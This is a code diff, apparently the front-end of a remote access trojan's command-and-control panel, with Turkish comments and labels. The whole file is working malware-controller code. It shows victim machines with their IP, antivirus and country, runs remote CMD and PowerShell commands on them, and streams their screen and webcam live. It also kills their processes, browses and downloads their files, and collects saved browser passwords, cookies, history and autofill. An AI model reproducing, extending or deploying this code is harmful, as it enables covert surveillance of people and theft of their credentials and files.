+                document.getElementById('info-go').textContent        = s.go_version;
+                document.getElementById('info-http').textContent      = ':' + s.http_port;
+                document.getElementById('info-tcp').textContent       = ':' + s.tcp_port;
+            } catch (e) {}
+        }
+
+        // ─── Client Listesi ──────────────────────────────
+        let selectedID = null;
+        let currentShell = 'cmd';
+        let outputPollInterval = null;
+
+        const shellState = {
+            cmd: { seenIndex: 0, clearedAt: 0 },
+            ps:  { seenIndex: 0, clearedAt: 0 }
+        };
+
+        function selectFromData(el) {
+            const d = el.dataset;
+            selectClient(el, d.id, d.ip, d.time, d.win, d.desktop, d.av, d.country);
+        }
+
+        function selectClient(el, id, ip, connTime, winver, desktop, av, country) {
+            selectedID = id;
+            shellState.cmd = { seenIndex: 0, clearedAt: 0 };
+            shellState.ps  = { seenIndex: 0, clearedAt: 0 };
+
+            // Aktif streaming varsa durdur
+            if (isScreening) { isScreening = false; stopScreenPoll(); updateScreenUI(false); }
+            if (isCaming)    { isCaming    = false; stopCamPoll();    updateCamUI(false);    }
+            // Task manager sıfırla
+            taskData = [];
+            document.getElementById('task-empty').style.display = 'flex';
+            document.getElementById('taskmgr-table').style.display = 'none';
+            document.getElementById('task-count').textContent = '— process';
+            document.getElementById('task-search').value = '';
+            setTaskStatus('', '');
+            stopTaskAutoRefresh();
+            // File browser sıfırla
+            fbReset();
+
+            document.querySelectorAll('.client-row').forEach(r => r.classList.remove('active'));
+            el.classList.add('active');
+
+            document.getElementById('detail-empty').style.display = 'none';
+            document.getElementById('detail-content').style.display = 'flex';
+            document.getElementById('detail-ip').textContent      = ip;
+            document.getElementById('detail-id').textContent      = '#' + id;
+            document.getElementById('detail-time').textContent    = connTime;
+            document.getElementById('detail-win').textContent     = winver  || '';
+            document.getElementById('detail-desktop').textContent = desktop ? '\u{1F5A5} ' + desktop : '';
+            document.getElementById('detail-av').textContent      = av      ? '\u{1F6E1} ' + av : '';
+            document.getElementById('detail-country').textContent = country || '';
+            document.getElementById('msg-status').textContent     = '';
+            document.getElementById('msg-input').value            = '';
+
+            switchTab('msg');
+
+            if (window.innerWidth <= 768) {
+                document.getElementById('client-panel').style.display = 'none';
+                document.getElementById('detail-panel').style.display = 'flex';
+                document.getElementById('back-btn').style.display = 'inline-block';
+            }
+        }
+
+        function closeDetail() {
+            selectedID = null;
+            stopOutputPoll();
+            stopScreenPoll();
+            stopCamPoll();
+            stopTaskAutoRefresh();
+            isScreening = false;
+            isCaming = false;
+            document.querySelectorAll('.client-row').forEach(r => r.classList.remove('active'));
+            document.getElementById('detail-empty').style.display = 'flex';
+            document.getElementById('detail-content').style.display = 'none';
+
+            if (window.innerWidth <= 768) {
+                document.getElementById('client-panel').style.display = 'flex';
+                document.getElementById('detail-panel').style.display = 'none';
+            }
+        }
+
+        function switchTab(tab) {
+            document.getElementById('content-msg').style.display    = tab === 'msg'    ? 'block' : 'none';
+            document.getElementById('content-shell').style.display  = tab === 'shell'  ? 'flex'  : 'none';
+            document.getElementById('content-screen').style.display = tab === 'screen' ? 'flex'  : 'none';
+            document.getElementById('content-cam').style.display    = tab === 'cam'    ? 'flex'  : 'none';
+            document.getElementById('content-tasks').style.display  = tab === 'tasks'  ? 'flex'  : 'none';
+            document.getElementById('content-files').style.display  = tab === 'files'  ? 'flex'  : 'none';
+            document.getElementById('content-rfe').style.display    = tab === 'rfe'    ? 'flex'  : 'none';
+            document.getElementById('content-browse-browser').style.display = tab === 'browse-browser' ? 'flex' : 'none';
+            document.getElementById('content-browse-social').style.display  = tab === 'browse-social'  ? 'flex' : 'none';
+            document.getElementById('tab-msg').classList.toggle('active', tab === 'msg');
+            document.getElementById('tab-shell').classList.toggle('active', tab === 'shell');
+            document.getElementById('tab-screen').classList.toggle('active', tab === 'screen');
+            document.getElementById('tab-cam').classList.toggle('active', tab === 'cam');
+            document.getElementById('tab-tasks').classList.toggle('active', tab === 'tasks');
+            document.getElementById('tab-files').classList.toggle('active', tab === 'files');
+            document.getElementById('tab-rfe').classList.toggle('active', tab === 'rfe');
+            document.getElementById('tab-browse').classList.toggle('active', tab === 'browse-browser' || tab === 'browse-social');
+            document.getElementById('shell-menu').classList.remove('open');
+            document.getElementById('browse-menu').classList.remove('open');
+
+            if (tab === 'shell') {
+                startOutputPoll();
+                if (window.innerWidth > 768) setTimeout(() => document.getElementById('shell-input').focus(), 100);
+            } else {
+                stopOutputPoll();
+            }
+
+            if (tab !== 'screen') {
+                if (isScreening) screenStop(); else stopScreenPoll();
+            } else { syncScreenStatus(); }
+
+            if (tab !== 'cam') {
+                if (isCaming) camStop(); else stopCamPoll();
+            } else { syncCamStatus(); }
+
+            if (tab === 'tasks') {
+                loadTasks();
+                startTaskAutoRefresh();
+            } else {
+                stopTaskAutoRefresh();
+            }
+
+            if (tab === 'files') {
+                if (fbCurrentPath === null) fbNavigate('');
+            }
+        }
+
+        function toggleShellMenu() {
+            const menu = document.getElementById('shell-menu');
+            const btn  = document.getElementById('tab-shell');
+            if (menu.classList.contains('open')) {
+                menu.classList.remove('open');
+                return;
+            }
+            const rect = btn.getBoundingClientRect();
+            menu.style.top  = (rect.bottom + 6) + 'px';
+            menu.style.left = rect.left + 'px';
+            menu.classList.add('open');
+        }
+
+        function toggleBrowseMenu() {
+            const menu = document.getElementById('browse-menu');
+            const btn  = document.getElementById('tab-browse');
+            if (menu.classList.contains('open')) {
+                menu.classList.remove('open');
+                return;
+            }
+            const rect = btn.getBoundingClientRect();
+            menu.style.top  = (rect.bottom + 6) + 'px';
+            menu.style.left = rect.left + 'px';
+            menu.classList.add('open');
+        }
+
+        function openBrowseData(type) {
+            document.getElementById('browse-menu').classList.remove('open');
+            switchTab('browse-' + type);
+        }
+
+        // ─── Collect Browser Data ────────────────────────
+        async function collectBrowserData(browser) {
+            if (!selectedID) {
+                setBrowseBrowserStatus('Önce bir client seçin.', 'error');
+                return;
+            }
+            const btn = document.getElementById('collect-btn-' + browser);
+            const statusEl = document.getElementById('collect-status-' + browser);
+            btn.disabled = true;
+            btn.textContent = '⏳ Toplanıyor...';
+            statusEl.textContent = '';
+            statusEl.className = 'collect-status';
+            setBrowseBrowserStatus('⏳ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' verisi toplanıyor...', 'loading');
+            try {
+                const res = await fetch('/api/browser/collect', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, browser: browser })
+                });
+                if (res.status === 504) {
+                    statusEl.textContent = 'Timeout';
+                    statusEl.className = 'collect-status collect-err';
+                    setBrowseBrowserStatus('Timeout: client 30 saniye içinde yanıt vermedi.', 'error');
+                } else if (!res.ok) {
+                    const txt = await res.text();
+                    statusEl.textContent = 'Hata';
+                    statusEl.className = 'collect-status collect-err';
+                    setBrowseBrowserStatus('Sunucu hatası: ' + txt, 'error');
+                } else {
+                    const data = await res.json();
+                    if (data.success) {
+                        if (data.passwords !== undefined) document.getElementById(browser + '-passwords').textContent = data.passwords;
+                        if (data.cookies   !== undefined) document.getElementById(browser + '-cookies').textContent   = data.cookies;
+                        if (data.history   !== undefined) document.getElementById(browser + '-history').textContent   = data.history;
+                        if (data.autofill  !== undefined) document.getElementById(browser + '-autofill').textContent  = data.autofill;
+                        statusEl.textContent = '✓';
+                        statusEl.className = 'collect-status collect-ok';
+                        setBrowseBrowserStatus('✓ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' verisi başarıyla toplandı.', 'ok');
+                    } else {
+                        statusEl.textContent = '✕';
+                        statusEl.className = 'collect-status collect-err';
+                        setBrowseBrowserStatus('✕ ' + (data.message || 'Veri toplanamadı.'), 'error');
+                    }
+                }
+            } catch (e) {
+                statusEl.textContent = '✕';
+                statusEl.className = 'collect-status collect-err';
+                setBrowseBrowserStatus('Bağlantı hatası: ' + e.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '⬇ Collect Data';
+            }
+        }
+
+        function setBrowseBrowserStatus(msg, type) {
+            const bar = document.getElementById('browse-browser-statusbar');
+            bar.textContent = msg;
+            bar.className = 'browse-statusbar';
+            if (type === 'ok')      bar.classList.add('browse-sb-ok');
+            if (type === 'error')   bar.classList.add('browse-sb-err');
+            if (type === 'loading') bar.classList.add('browse-sb-loading');
+        }
+
+        function openShell(type) {
+            currentShell = type;
+            document.getElementById('shell-menu').classList.remove('open');
+            const label = document.getElementById('terminal-label');
+            label.textContent = type === 'ps' ? 'PowerShell' : 'CMD';
+            label.className = 'terminal-type-label ' + type;
+            document.getElementById('term-prompt').textContent = type === 'ps' ? 'PS>' : 'C:\\>';
+            shellState[type].clearedAt = shellState[type].seenIndex;
+            document.getElementById('terminal-output').innerHTML = '';
+            switchTab('shell');
+            updateMobileKeyboard();
+        }
+
+        function clearTerminal() {
+            shellState[currentShell].clearedAt = shellState[currentShell].seenIndex;
+            document.getElementById('terminal-output').innerHTML = '';
+        }
+
+        async function sendMessage() {
+            const msg = document.getElementById('msg-input').value.trim();
+            const status = document.getElementById('msg-status');
+            if (!msg) {
+                status.textContent = 'Mesaj boş olamaz.';
+                status.className = 'action-status error';
+                return;
+            }
+            try {
+                const res = await fetch('/api/send', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, cmd: '[msg] ' + msg })
+                });
+                if (res.ok) {
+                    status.textContent = 'Mesaj gönderildi.';
+                    status.className = 'action-status success';
+                    document.getElementById('msg-input').value = '';
+                } else {
+                    status.textContent = 'Gönderilemedi. (' + res.status + ')';
+                    status.className = 'action-status error';
+                }
+            } catch (e) {
+                status.textContent = 'Bağlantı hatası.';
+                status.className = 'action-status error';
+            }
+        }
+
+        function updateMobileKeyboard() {
+            const isMobile = window.innerWidth <= 768;
+            document.getElementById('mobile-keyboard').style.display = isMobile ? 'block' : 'none';
+        }
+
+        async function sendMobileShellCommand() {
+            const input = document.getElementById('mobile-shell-input');
+            const cmd = input.value.trim();
+            if (!cmd || !selectedID) return;
+            const prefix     = currentShell === 'ps' ? '[exec_ps]' : '[exec_cmd]';
+            const promptText = currentShell === 'ps' ? 'PS>' : 'C:\\>';
+            appendTerminalLine('cmd', promptText + ' ' + cmd);
+            input.value = '';
+            try {
+                await fetch('/api/send', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
+                });
+            } catch (e) {
+                appendTerminalLine('error', 'Gönderilemedi.');
+            }
+        }
+
+        async function sendShellCommand() {
+            const input = document.getElementById('shell-input');
+            const cmd = input.value.trim();
+            if (!cmd || !selectedID) return;
+            const prefix     = currentShell === 'ps' ? '[exec_ps]' : '[exec_cmd]';
+            const promptText = currentShell === 'ps' ? 'PS>' : 'C:\\>';
+            appendTerminalLine('cmd', promptText + ' ' + cmd);
+            input.value = '';
+            try {
+                await fetch('/api/send', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
+                });
+            } catch (e) {
+                appendTerminalLine('error', 'Gönderilemedi.');
+            }
+        }
+
+        function appendTerminalLine(type, text) {
+            const out = document.getElementById('terminal-output');
+            const div = document.createElement('div');
+            div.className = 'term-line term-' + type;
+            div.textContent = text;
+            out.appendChild(div);
+            out.scrollTop = out.scrollHeight;
+        }
+
+        function startOutputPoll() {
+            stopOutputPoll();
+            outputPollInterval = setInterval(pollOutput, 1000);
+        }
+        function stopOutputPoll() {
+            if (outputPollInterval) { clearInterval(outputPollInterval); outputPollInterval = null; }
+        }
+
+
+        // ─── Live Camera ─────────────────────────────────
+        let camPollInterval = null;
+        let isCaming = false;
+        let currentCamFps = 10;
+
+        function onCamFpsChange(val) {
+            currentCamFps = parseInt(val);
+            document.getElementById('cam-fps-value').textContent = val;
+            if (isCaming && selectedID) {
+                fetch('/api/cam/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'start', fps: currentCamFps })
+                }).catch(() => {});
+                startCamPoll();
+            }
+        }
+
+        async function camStart() {
+            if (!selectedID) return;
+            try {
+                const res = await fetch('/api/cam/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'start', fps: currentCamFps })
+                });
+                if (res.ok) {
+                    isCaming = true;
+                    updateCamUI(true);
+                    startCamPoll();
+                }
+            } catch (e) {}
+        }
+
+        async function camStop() {
+            if (!selectedID) return;
+            isCaming = false;
+            updateCamUI(false);
+            stopCamPoll();
+            document.getElementById('cam-img').style.display = 'none';
+            document.getElementById('cam-placeholder').style.display = 'flex';
+            try {
+                await fetch('/api/cam/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'stop' })
+                });
+            } catch (e) {}
+        }
+
+        function updateCamUI(active) {
+            document.getElementById('cam-start-btn').style.display = active ? 'none'        : 'inline-flex';
+            document.getElementById('cam-stop-btn').style.display  = active ? 'inline-flex' : 'none';
+            const label = document.getElementById('cam-status-label');
+            label.textContent = active ? 'Yayında' : 'Durduruldu';
+            label.className   = 'screen-status-label ' + (active ? 'live' : '');
+            const dot = document.getElementById('cam-dot');
+            dot.className = 'stream-dot cam' + (active ? ' live' : '');
+        }
+
+        async function syncCamStatus() {
+            if (!selectedID) return;
+            try {
+                const res = await fetch('/api/cam/status?id=' + selectedID, { credentials: 'include' });
+                if (!res.ok) return;
+                const data = await res.json();
+                isCaming = data.caming;
+                updateCamUI(isCaming);
+                if (isCaming) startCamPoll();
+            } catch (e) {}
+        }
+
+        function startCamPoll() {
+            stopCamPoll();
+            const interval = Math.max(50, Math.floor(1000 / currentCamFps));
+            camPollInterval = setInterval(pollCam, interval);
+        }
+
+        function stopCamPoll() {
+            if (camPollInterval) { clearInterval(camPollInterval); camPollInterval = null; }
+        }
+
+        async function pollCam() {
+            if (!selectedID || !isCaming) return;
+            try {
+                const res = await fetch('/api/cam?id=' + selectedID, { credentials: 'include' });
+                if (res.status === 204) return;
+                if (!res.ok) return;
+                const data = await res.json();
+                if (!data.frame) return;
+                const img = document.getElementById('cam-img');
+                img.src = 'data:image/jpeg;base64,' + data.frame;
+                img.style.display = 'block';
+                document.getElementById('cam-placeholder').style.display = 'none';
+            } catch (e) {}
+        }
+
+        // ─── Live Screen ─────────────────────────────────
+        let screenPollInterval = null;
+        let isScreening = false;
+        let currentFps = 10;
+
+        function onFpsChange(val) {
+            currentFps = parseInt(val);
+            document.getElementById('fps-value').textContent = val;
+            // Yayın aktifse yeni FPS'i hemen uygula
+            if (isScreening && selectedID) {
+                fetch('/api/screen/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
+                }).catch(() => {});
+                // Poll hızını da güncelle
+                startScreenPoll();
+            }
+        }
+
+        async function screenStart() {
+            if (!selectedID) return;
+            try {
+                const res = await fetch('/api/screen/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
+                });
+                if (res.ok) {
+                    isScreening = true;
+                    updateScreenUI(true);
+                    startScreenPoll();
+                }
+            } catch (e) {}
+        }
+
+        async function screenStop() {
+            if (!selectedID) return;
+            isScreening = false;
+            updateScreenUI(false);
+            stopScreenPoll();
+            document.getElementById('screen-img').style.display = 'none';
+            document.getElementById('screen-placeholder').style.display = 'flex';
+            try {
+                await fetch('/api/screen/ctrl', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, action: 'stop' })
+                });
+            } catch (e) {}
+        }
+
+        function updateScreenUI(active) {
+            document.getElementById('screen-start-btn').style.display = active ? 'none'        : 'inline-flex';
+            document.getElementById('screen-stop-btn').style.display  = active ? 'inline-flex' : 'none';
+            const label = document.getElementById('screen-status-label');
+            label.textContent = active ? 'Yayında' : 'Durduruldu';
+            label.className   = 'screen-status-label ' + (active ? 'live' : '');
+            const dot = document.getElementById('screen-dot');
+            dot.className = 'stream-dot' + (active ? ' live' : '');
+        }
+
+        async function syncScreenStatus() {
+            if (!selectedID) return;
+            try {
+                const res = await fetch(`/api/screen/status?id=${selectedID}`, { credentials: 'include' });
+                if (!res.ok) return;
+                const data = await res.json();
+                isScreening = data.screening;
+                updateScreenUI(isScreening);
+                if (isScreening) startScreenPoll();
+            } catch (e) {}
+        }
+
+        function startScreenPoll() {
+            stopScreenPoll();
+            const interval = Math.max(50, Math.floor(1000 / currentFps));
+            screenPollInterval = setInterval(pollScreen, interval);
+        }
+
+        function stopScreenPoll() {
+            if (screenPollInterval) { clearInterval(screenPollInterval); screenPollInterval = null; }
+        }
+
+        async function pollScreen() {
+            if (!selectedID || !isScreening) return;
+            try {
+                const res = await fetch(`/api/screen?id=${selectedID}`, { credentials: 'include' });
+                if (res.status === 204) return;
+                if (!res.ok) return;
+                const data = await res.json();
+                if (!data.frame) return;
+                const img = document.getElementById('screen-img');
+                img.src = 'data:image/jpeg;base64,' + data.frame;
+                img.style.display = 'block';
+                document.getElementById('screen-placeholder').style.display = 'none';
+            } catch (e) {}
+        }
+
+        async function pollOutput() {
+            if (!selectedID) return;
+            const state = shellState[currentShell];
+            try {
+                const res = await fetch(`/api/output?id=${selectedID}`, { credentials: 'include' });
+                if (!res.ok) return;
+                const outputs = await res.json();
+                if (!outputs || !outputs.length) return;
+                const filtered = outputs.filter(o => o.kind === currentShell);
+                for (let i = state.seenIndex; i < filtered.length; i++) {
+                    if (i >= state.clearedAt) appendTerminalLine('output', filtered[i].data);
+                }
+                state.seenIndex = filtered.length;
+            } catch (e) {}
+        }
+
+        // ─── Task Manager ────────────────────────────────
+        let taskData       = [];   // tüm process listesi
+        let taskSortCol    = 'mem';
+        let taskSortAsc    = false;
+        let taskAutoInterval = null;
+
+        async function loadTasks() {
+            if (!selectedID) return;
+            const btn = document.getElementById('task-refresh-btn');
+            btn.disabled = true;
+            btn.textContent = '↻ Yükleniyor...';
+            setTaskStatus('', '');
+            try {
+                const res = await fetch('/api/tasklist', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID })
+                });
+                if (!res.ok) {
+                    setTaskStatus('error', 'Hata: ' + res.status);
+                    return;
+                }
+                const procs = await res.json();
+                taskData = procs || [];
+                renderTasks();
+            } catch (e) {
+                setTaskStatus('error', 'Bağlantı hatası.');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '↻ Yenile';
+            }
+        }
+
+        function renderTasks() {
+            const search = (document.getElementById('task-search').value || '').toLowerCase();
+            let list = taskData.filter(p =>
+                p.name.toLowerCase().includes(search) ||
+                p.pid.toString().includes(search)
+            );
+
+            // Sıralama
+            list.sort((a, b) => {
+                let va = a[taskSortCol], vb = b[taskSortCol];
+                if (taskSortCol === 'pid' || taskSortCol === 'cpu' || taskSortCol === 'mem') {
+                    va = parseFloat(va) || 0;
+                    vb = parseFloat(vb) || 0;
+                } else {
+                    va = va.toLowerCase();
+                    vb = vb.toLowerCase();
+                }
+                if (va < vb) return taskSortAsc ? -1 :  1;
+                if (va > vb) return taskSortAsc ?  1 : -1;
+                return 0;
+            });
+
+            document.getElementById('task-count').textContent = `${list.length} / ${taskData.length} process`;
+            document.getElementById('task-empty').style.display = 'none';
+            const table = document.getElementById('taskmgr-table');
+            table.style.display = '';
+
+            const tbody = document.getElementById('task-tbody');
+            tbody.innerHTML = list.map(p => {
+                const cpu = parseFloat(p.cpu) || 0;
+                const mem = parseFloat(p.mem) || 0;
+                const cpuClass = cpu > 50 ? 'val-high' : cpu > 15 ? 'val-mid' : 'val-low';
+                const memClass = mem > 500 ? 'val-high' : mem > 100 ? 'val-mid' : 'val-low';
+                const q = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+                return `<tr class="task-row" data-pid="${q(p.pid)}">
+                    <td class="col-pid mono">${q(p.pid)}</td>
+                    <td class="col-name">
+                        <span class="proc-icon">◉</span>
+                        <span class="proc-name">${q(p.name)}</span>
+                    </td>
+                    <td class="col-cpu"><span class="val-badge ${cpuClass}">${cpu.toFixed(1)}</span></td>
+                    <td class="col-mem"><span class="val-badge ${memClass}">${mem.toFixed(1)}</span></td>
+                    <td class="col-kill">
+                        <button class="kill-btn" onclick="killProcess(${q(p.pid)}, '${q(p.name)}')" title="Sonlandır">✕</button>
+                    </td>
+                </tr>`;
+            }).join('');
+
+            // Sort arrow güncelle
+            ['pid','name','cpu','mem'].forEach(col => {
+                const el = document.getElementById('sort-' + col);
+                if (!el) return;
+                el.textContent = col === taskSortCol ? (taskSortAsc ? '▲' : '▼') : '';
+            });
+        }
+
+        function sortTasks(col) {
+            if (taskSortCol === col) {
+                taskSortAsc = !taskSortAsc;
+            } else {
+                taskSortCol = col;
+                taskSortAsc = col === 'name';
+            }
+            renderTasks();
+        }
+
+        function filterTasks() {
+            renderTasks();
+        }
+
+        async function killProcess(pid, name) {
+            if (!selectedID) return;
+            if (!confirm(`"${name}" (PID: ${pid}) sonlandırılsın mı?`)) return;
+            setTaskStatus('info', `PID ${pid} sonlandırılıyor...`);
+            try {
+                const res = await fetch('/api/taskkill', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, pid: pid })
+                });
+                if (!res.ok) {
+                    setTaskStatus('error', 'Sunucu hatası: ' + res.status);
+                    return;
+                }
+                const data = await res.json();
+                if (data.success) {
+                    setTaskStatus('success', `✓ PID ${pid} sonlandırıldı`);
+                    // Satırı hemen tablodan kaldır
+                    taskData = taskData.filter(p => parseInt(p.pid) !== pid);
+                    renderTasks();
+                } else {
+                    setTaskStatus('error', `✗ ${data.message}`);
+                }
+            } catch (e) {
+                setTaskStatus('error', 'Bağlantı hatası.');
+            }
+        }
+
+        function setTaskStatus(type, msg) {
+            const bar = document.getElementById('taskmgr-statusbar');
+            bar.textContent = msg;
+            bar.className = 'taskmgr-statusbar' + (type ? ' status-' + type : '');
+        }
+
+        function startTaskAutoRefresh() {
+            stopTaskAutoRefresh();
+            taskAutoInterval = setInterval(() => {
+                const tab = document.getElementById('content-tasks');
+                if (tab && tab.style.display !== 'none' && selectedID) {
+                    loadTasks();
+                }
+            }, 5000);
+        }
+
+        function stopTaskAutoRefresh() {
+            if (taskAutoInterval) { clearInterval(taskAutoInterval); taskAutoInterval = null; }
+        }
+
+        // ─── File Browser ─────────────────────────────────
+        let fbCurrentPath  = null;   // null = henüz açılmadı
+        let fbHistory      = [];     // geri geçmişi
+        let fbData         = [];     // mevcut dizinin öğeleri
+        let fbSep          = '/';
+        let fbSortCol      = 'name';
+        let fbSortAsc      = true;
+        let fbCtxTarget    = null;   // sağ tık hedefi {name, type, fullPath}
+        let fbLoading      = false;
+
+        function fbReset() {
+            fbCurrentPath = null;
+            fbHistory     = [];
+            fbData        = [];
+            document.getElementById('fb-breadcrumb').innerHTML = '';
+            document.getElementById('fb-empty').style.display = 'flex';
+            document.getElementById('fb-table').style.display = 'none';
+            document.getElementById('fb-back-btn').disabled = true;
+            document.getElementById('fb-up-btn').disabled   = true;
+            fbSetStatus('', '');
+        }
+
+        async function fbNavigate(path) {
+            if (!selectedID || fbLoading) return;
+            fbLoading = true;
+            fbSetStatus('info', '↻ Yükleniyor...');
+            try {
+                const res = await fetch('/api/fb/ls', {
+                    method: 'POST', credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: selectedID, path: path })
+                });
+                if (!res.ok) { fbSetStatus('error', 'Hata: ' + res.status); return; }
+                const data = await res.json();
+                if (data.error) { fbSetStatus('error', data.error); return; }
+
+                // Geçmişe ekle
+                if (fbCurrentPath !== null && fbCurrentPath !== path) {
+                    fbHistory.push(fbCurrentPath);
+                }
+                fbCurrentPath = data.path !== undefined ? data.path : path;
+                fbSep   = data.sep || '/';
+                fbData  = data.items || [];
+                fbRenderBreadcrumb();
+                fbRenderList();
+                document.getElementById('fb-back-btn').disabled = fbHistory.length === 0;
+                document.getElementById('fb-up-btn').disabled   = !fbCurrentPath;
+                fbSetStatus('', `${fbData.filter(i=>i.type==='dir'||i.type==='drive').length} klasör, ${fbData.filter(i=>i.type==='file').length} dosya`);
+            } catch(e) {
+                fbSetStatus('error', 'Bağlantı hatası');
+            } finally {
+                fbLoading = false;
+            }
+        }
+
+        function fbRefresh() { if (fbCurrentPath !== null) fbNavigate(fbCurrentPath); }
+        function fbGoBack()  { if (fbHistory.length) fbNavigate(fbHistory.pop()); }
+        function fbGoUp() {
+            if (!fbCurrentPath) return;
+            // Windows: C:\ → kök (boş), Linux: /a/b → /a
+            const parts = fbCurrentPath.replace(/[/\\]+$/, '').split(/[/\\]/);
+            if (parts.length <= 1) { fbNavigate(''); return; }
+            parts.pop();
+            const up = parts.join(fbSep) || fbSep;
+            fbNavigate(up);
+        }
+
+        function fbRenderBreadcrumb() {
+            const bc = document.getElementById('fb-breadcrumb');
+            if (!fbCurrentPath) {
+                bc.innerHTML = '<span class="fb-bc-item active">Bu Bilgisayar</span>';
+                return;
+            }
+            const parts = fbCurrentPath.replace(/[/\\]+$/, '').split(/[/\\]/);
+            const qa = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
+            let html = '<span class="fb-bc-item fb-bc-root fb-bc-nav" data-bcpath="">⌂</span>';
+            let built = '';
+            parts.forEach((p, i) => {
+                if (!p) return;
+                if (fbSep === '\\' && i === 0) {
+                    built = p + fbSep;
+                } else {
+                    built = built ? built + fbSep + p : p;
+                }
+                const isLast = i === parts.length - 1;
+                const path   = built;
+                html += `<span class="fb-bc-sep">${fbSep}</span>`;
+                html += isLast
+                    ? `<span class="fb-bc-item active">${_fbEsc(p)}</span>`
+                    : `<span class="fb-bc-item fb-bc-nav" data-bcpath="${qa(path)}">${_fbEsc(p)}</span>`;
+            });
+            bc.innerHTML = html;
+        }
+
+        function fbRenderList() {
+            const table = document.getElementById('fb-table');
+            const empty = document.getElementById('fb-empty');
+            if (!fbData.length && fbCurrentPath === '') {
+                empty.style.display = 'flex';
+                table.style.display = 'none';
+                return;
+            }
+            empty.style.display = 'none';
+            table.style.display = '';
+
+            // Sırala: klasörler önce, sonra dosyalar
+            let dirs  = fbData.filter(i => i.type === 'dir' || i.type === 'drive');
+            let files = fbData.filter(i => i.type === 'file');
+
+            const sortFn = (a, b) => {
+                let va = a[fbSortCol] || '', vb = b[fbSortCol] || '';
+                if (fbSortCol === 'size') { va = +va; vb = +vb; }
+                else { va = String(va).toLowerCase(); vb = String(vb).toLowerCase(); }
+                if (va < vb) return fbSortAsc ? -1 :  1;
+                if (va > vb) return fbSortAsc ?  1 : -1;
+                return 0;
+            };
+            dirs.sort(sortFn);
+            files.sort(sortFn);
+            const list = [...dirs, ...files];
+
+            document.getElementById('fb-tbody').innerHTML = list.map(item => {
+                const fullPath = fbBuildPath(item.name);
+                const icon     = fbIcon(item);
+                const sizeStr  = item.type === 'file' ? fbFmtSize(item.size) : '—';
+                const qa = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
+                const isDir = item.type === 'dir' || item.type === 'drive';
+                return `<tr class="fb-row ${isDir ? 'fb-dir' : 'fb-file'}"
+                            data-name="${qa(item.name)}"
+                            data-type="${qa(item.type)}"
+                            data-path="${qa(fullPath)}"
+                            data-isdir="${isDir ? '1' : '0'}">
+                    <td class="fb-col-icon">${icon}</td>
+                    <td class="fb-col-name"><span class="fb-name">${_fbEsc(item.name)}${item.link ? ' <span class="fb-link-badge">↩</span>' : ''}</span></td>
+                    <td class="fb-col-size mono">${sizeStr}</td>
+                    <td class="fb-col-mtime">${item.mtime || '—'}</td>
+                    <td class="fb-col-act">
+                        <button class="fb-act-btn ${isDir ? 'fb-act-open' : 'fb-act-dl'}" title="${isDir ? 'Aç' : 'İndir'}">${isDir ? '→' : '↓'}</button>
+                    </td>
+                </tr>`;
+            }).join('');
+
+            // Sort arrows
+            ['name','size','mtime'].forEach(col => {
+                const el = document.getElementById('fb-sort-' + col);
+                if (el) el.textContent = col === fbSortCol ? (fbSortAsc ? '▲' : '▼') : '';
+            });
+        }
+
+        function fbBuildPath(name) {
+            if (!fbCurrentPath) return name; // drive seçimi
+            const trail = fbCurrentPath.endsWith(fbSep) ? '' : fbSep;
+            return fbCurrentPath + trail + name;
+        }
+
+        function fbSort(col) {
+            if (fbSortCol === col) fbSortAsc = !fbSortAsc;
+            else { fbSortCol = col; fbSortAsc = col === 'name'; }
+            fbRenderList();
+        }
+
+        function fbRowDblClick(type, fullPath) {
+            if (type === 'dir' || type === 'drive') fbNavigate(fullPath);
+            else fbDownload(fullPath, fullPath.split(/[/\\]/).pop());
+        }
+
+        function fbIcon(item) {
+            if (item.type === 'drive') return '<span class="fb-icon drive">⬡</span>';
+            if (item.type === 'dir')   return '<span class="fb-icon dir">◧</span>';
+            const ext = (item.ext || '').toLowerCase();
+            if (['.jpg','.jpeg','.png','.gif','.bmp','.webp','.svg','.ico'].includes(ext))
+                return '<span class="fb-icon img">▨</span>';
+            if (['.mp4','.mkv','.avi','.mov','.wmv','.flv'].includes(ext))
+                return '<span class="fb-icon vid">▶</span>';
+            if (['.mp3','.wav','.ogg','.flac','.aac'].includes(ext))
+                return '<span class="fb-icon aud">♪</span>';
+            if (['.zip','.rar','.7z','.tar','.gz','.bz2'].includes(ext))
+                return '<span class="fb-icon arc">◈</span>';
